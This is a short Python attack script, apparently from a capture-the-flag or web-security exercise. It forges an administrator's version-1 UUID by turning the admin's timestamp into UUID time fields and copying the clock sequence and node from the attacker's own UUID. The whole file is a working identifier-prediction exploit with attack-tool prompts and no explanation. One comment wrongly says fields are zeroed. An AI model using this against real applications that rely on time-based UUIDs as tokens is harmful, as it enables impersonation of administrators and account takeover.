from datetime import datetime, timedelta

def iso_timestamp_to_uuid_v1(iso_timestamp):

    # Parse the ISO 8601 timestamp string into a datetime object
    target_time = datetime.strptime(iso_timestamp, "%Y-%m-%dT%H:%M:%S.%fZ")
    
    # UUID v1 base epoch (Gregorian calendar start)
    gregorian_epoch = datetime(1582, 10, 15, 0, 0, 0)
    
    # Calculate the difference in 100-nanosecond intervals
    time_difference = target_time - gregorian_epoch
    timestamp = int(time_difference.total_seconds() * 10**7)  # 100-nanoseconds intervals
    
    # Split the timestamp into UUID components
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_and_version = (timestamp >> 48) & 0x0FFF
    
    # Add the version bits to time_hi_and_version (version 1)
    time_hi_and_version |= (1 << 12)
    
    # Format the UUID
    reversed_uuid = f"{time_low:08x}-{time_mid:04x}-{time_hi_and_version:04x}-0000-000000000000"
    return reversed_uuid, timestamp

def replace_clock_seq_and_node(admin_uuid, user_uuid):
    # Split the UUID into its parts
    parts_final = admin_uuid.split("-")
    parts = user_uuid.split("-")
    
    # Replace the clock_seq and node with zeros
    parts_final[3] = parts[3]
    parts_final[4] = parts[4]
    
    # Reassemble the UUID
    modified_uuid = "-".join(parts_final)
    return modified_uuid


iso_timestamp = input("[?] Admin's timestamp: ")
uuid, timestamp_str = iso_timestamp_to_uuid_v1(iso_timestamp)

user_uuid = input("[?] Your UUID: ")
admin_uuid = replace_clock_seq_and_node(uuid , user_uuid)

print("[+] Admin's UUID:", admin_uuid)
